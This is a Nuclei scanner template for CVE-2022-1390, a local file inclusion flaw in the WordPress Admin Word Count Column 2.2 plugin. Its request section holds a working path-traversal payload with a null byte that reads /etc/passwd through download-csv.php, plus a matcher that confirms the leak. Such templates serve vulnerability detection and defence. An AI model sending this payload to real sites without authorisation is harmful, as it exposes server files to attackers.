id: CVE-2022-1390

info:
  name: WordPress Admin Word Count Column 2.2 - Local File Inclusion
  author: daffainfo,Splint3r7
  severity: high
  description: The plugin does not validate the path parameter given to readfile(), which could allow unauthenticated attackers to read arbitrary files on server running old version of PHP susceptible to the null byte technique. This could also lead to RCE by using a Phar Deserialization technique.
  reference:
    - https://packetstormsecurity.com/files/166476/WordPress-Admin-Word-Count-Column-2.2-Local-File-Inclusion.html
    - https://wordpress.org/plugins/admin-word-count-column/
    - https://wpscan.com/vulnerability/6293b319-dc4f-4412-9d56-55744246c990
  remediation: This plugin has been closed as of March 29, 2022 and is not available for download.
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-22
    cve-id: CVE-2022-1390
  tags: wordpress,wp-plugin,lfi,wp

requests:
  - method: GET
    path:
      - '{{BaseURL}}/wp-content/plugins/admin-word-count-column/download-csv.php?path=../../../../../../../../../../../../etc/passwd\0'

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "root:[x*]:0:0"

      - type: status
        status:
          - 200

# Enhanced by mp on 2022/08/01
